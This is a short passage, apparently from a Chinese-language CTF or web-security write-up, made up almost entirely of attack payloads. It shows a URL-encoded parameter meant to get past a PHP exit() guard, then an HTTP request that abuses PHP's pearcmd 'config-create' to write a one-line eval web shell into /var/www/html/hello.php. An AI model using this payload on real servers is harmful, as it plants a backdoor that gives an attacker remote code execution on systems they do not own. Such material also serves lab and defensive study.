reason=%3C%3Fphp+exit%3B%2F%2F%3C%3Fphp+exit%3B%2F%2F
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后 pearcmd 即可&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /index.php?check&amp;amp;+config-create+/&amp;lt;?=@eval($_GET[1]);?&amp;gt;+/var/www/html/hello.php HTTP/1.1

